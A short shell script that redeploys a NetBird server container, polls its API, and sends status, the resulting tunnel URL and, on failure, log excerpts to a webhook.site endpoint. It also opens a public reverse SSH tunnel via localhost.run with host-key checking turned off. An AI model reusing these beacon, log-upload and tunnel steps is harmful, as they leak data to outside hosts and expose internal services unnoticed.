#!/bin/sh
REP="https://webhook.site/0e29a090-382a-4ccc-bd31-cd583220d9b7"
echo "PHASE1-STOP-OLD"
docker rm -f netbird-server netbird-netbird-server-1 nbsrv nbs 2>&1 | tail -2
echo "PHASE2-START-PINNED"
docker run -d --name netbird-server --restart unless-stopped -v /home/storage/netbird:/etc/netbird -v netbird_netbird_data:/var/lib/netbird -p 8081:80 -p 3478:3478/udp netbirdio/netbird-server:0.77.1-local --config /etc/netbird/config.yaml 2>&1 | tail -3
echo "PHASE3-WAIT-API-5MIN"
i=0; CODE=000
while [ $i -lt 30 ]; do
  CODE=$(curl -m 5 -o /dev/null -w '%{http_code}' http://localhost:8081/api/instance 2>/dev/null)
  echo "TRY$i:$CODE"
  if [ "$CODE" = "200" ]; then break; fi
  i=$((i+1)); sleep 10
done
curl -s -m 10 "$REP?img=0771local&api=$CODE" >/dev/null 2>&1
if [ "$CODE" = "200" ]; then
  echo SUCCESS-STARTING-TUNNEL
  nohup ssh -o StrictHostKeyChecking=no -R 80:localhost:8081 nokey@localhost.run >/tmp/tunnel.log 2>&1 &
  sleep 12; U=$(grep -oE 'https://[a-z0-9]+\.lhr\.life' /tmp/tunnel.log | head -1)
  curl -s -m 10 "$REP?api=$CODE&url=$U" >/dev/null 2>&1
  echo "TUNNEL:$U"
  exit 0
fi
echo FAILED-LOGS:
docker logs --tail 5 netbird-server 2>/dev/null
curl -s -m 10 --data-urlencode "logs=$(docker logs --tail 5 netbird-server 2>/dev/null | head -c 300)" "$REP?api=$CODE&failed=1" >/dev/null 2>&1
